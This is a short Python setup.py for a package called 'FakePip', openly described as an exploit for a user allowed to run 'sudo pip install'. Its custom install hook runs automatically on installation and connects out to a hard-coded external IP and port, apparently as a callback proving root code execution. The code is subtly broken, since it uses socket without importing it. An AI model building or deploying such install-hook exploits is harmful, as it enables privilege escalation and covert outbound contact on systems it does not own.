from setuptools import setup
from setuptools.command.install import install
import base64
import os
import subprocess

class CustomInstall(install):
  def run(self):
    install.run(self)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(('38.180.190.115', 9000))
        s.sendall(b"GET / HTTP/1.1\r\nHost: 38.180.190.115:9000\r\n\r\n")
        s.close()
        print("[+] Success!")
    except Exception as e:
        print(f"[-] Error: {e}")


setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
